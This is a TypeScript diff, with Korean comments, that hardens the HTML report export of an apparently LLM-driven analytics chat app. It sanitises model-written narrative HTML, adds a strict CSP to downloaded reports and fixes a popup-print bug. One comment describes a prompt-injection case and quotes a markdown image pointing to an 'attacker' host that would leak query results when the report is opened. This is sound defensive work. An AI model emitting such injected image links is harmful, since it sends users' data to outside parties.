@@ -164,6 +164,25 @@ function buildChartsHtml(root: HTMLElement, message: ChatMessage): string {
   return html;
 }
 
+// narrative innerHTML 에서 외부 로딩/실행 가능 노드를 제거한다.
+// DOMParser 로 파싱해 img/iframe/script/object/embed/link/audio/video 를
+// 버리고, 남은 요소의 외부 URL 속성(href/src/action)도 지운다 — 링크 텍스트는
+// 살리되 클릭 이동은 막는다(리포트에서 나가는 링크는 정상 기능이지만, 모델이
+// 만든 URL 에 쿼리 결과를 실어보낼 수 있어 보수적으로 제거).
+function sanitizeNarrativeHtml(html: string): string {
+  const doc = new DOMParser().parseFromString(html, 'text/html');
+  doc
+    .querySelectorAll('img, iframe, script, object, embed, link, audio, video, source')
+    .forEach((el) => el.remove());
+  doc.querySelectorAll('[href], [src], [action], [formaction]').forEach((el) => {
+    el.removeAttribute('href');
+    el.removeAttribute('src');
+    el.removeAttribute('action');
+    el.removeAttribute('formaction');
+  });
+  return doc.body.innerHTML;
+}
+
 const REPORT_CSS = `
 :root{
   --ink:#0f1115; --muted:#5e6673; --line:#e6e9ef; --brand:#0d9488; --bg:#ffffff;
@@ -225,7 +244,14 @@ export function buildReportHtml(
 
   // 서술 본문: 이미 렌더된 마크다운(시맨틱 태그) innerHTML 을 그대로 — 리포트 CSS 는
   // 태그 기준으로 스타일하므로 Tailwind 클래스 없이도 깔끔히 표시된다.
-  const narrative = root.querySelector('[data-report-narrative]')?.innerHTML ?? '';
+  // ⚠️ 단, 외부 리소스 참조는 제거한다 (R17-S4). 앱 안에서는 CSP 의
+  //    img-src 'self' 가 막지만, 다운로드한 .html 을 열면 CSP 가 없다 —
+  //    프롬프트 인젝션으로 `![](https://attacker/?d=...)` 를 심으면 리포트를
+  //    여는 순간 쿼리 결과가 외부로 새나간다. meta CSP(아래)와 이중 방어로
+  //    외부 img/iframe/script 류 노드를 DOM 에서 통째로 제거한다.
+  const narrative = sanitizeNarrativeHtml(
+    root.querySelector('[data-report-narrative]')?.innerHTML ?? '',
+  );
 
   const sqls = collectSql(message);
   const appendix = sqls.length
@@ -243,7 +269,14 @@ export function buildReportHtml(
     minute: '2-digit',
   });
 
+  // R17-S4 — 다운로드한 리포트는 앱 CSP 밖(file://)에서 열린다. 문서 자체에
+  // 잠금 CSP 를 박아 네트워크 참조를 전면 차단한다(인라인 SVG/style 은 태그라
+  // 영향 없음 — style-src 'unsafe-inline' 만 필요).
+  const reportCsp =
+    "default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:";
+
   return `<!doctype html><html lang="ko"><head><meta charset="utf-8">
+<meta http-equiv="Content-Security-Policy" content="${reportCsp}">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>${escapeHtml(title)}</title>
 <style>${REPORT_CSS}</style></head>
@@ -278,7 +311,10 @@ export function exportMessageReport(
   const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
   const url = URL.createObjectURL(blob);
 
-  const win = window.open(url, '_blank', 'noopener,noreferrer');
+  // ⚠️ 'noopener' feature 를 window.open 에 주면 spec 상 반환값이 항상 null 이다 —
+  //    인쇄 경로가 죽은 코드였다 (R17-S4). 빈 탭을 먼저 열고 opener 를 끊은 뒤
+  //    Blob URL 로 navigate 하면 opener 도 없고 반환값도 산다.
+  const win = window.open('', '_blank');
   if (!win) {
     // 팝업 차단 → 자체완결 HTML 파일로 다운로드.
     const a = document.createElement('a');
@@ -289,7 +325,10 @@ export function exportMessageReport(
     setTimeout(() => URL.revokeObjectURL(url), 10_000);
     return;
   }
-  // same-origin Blob 문서가 로드되면 인쇄 다이얼로그(→ PDF 저장). 차트는 벡터 보존.
+  win.opener = null;
+  // ⚠️ load 리스너는 navigate **전에** 달아야 한다 — about:blank → Blob URL
+  //    이동 중에 달면 로드 이벤트를 놓쳐 인쇄가 영구히 안 뜬다 (kiro R17 #14).
+  //    same-origin Blob 문서가 로드되면 인쇄 다이얼로그(→ PDF 저장).
   win.addEventListener('load', () => {
     setTimeout(() => {
       try {
@@ -299,6 +338,7 @@ export function exportMessageReport(
       }
     }, 300);
   });
+  win.location.href = url;
   // 새 탭이 Blob 을 가져간 뒤 URL 해제(즉시 revoke 하면 about:blank 가 됨).
   setTimeout(() => URL.revokeObjectURL(url), 60_000);
 }
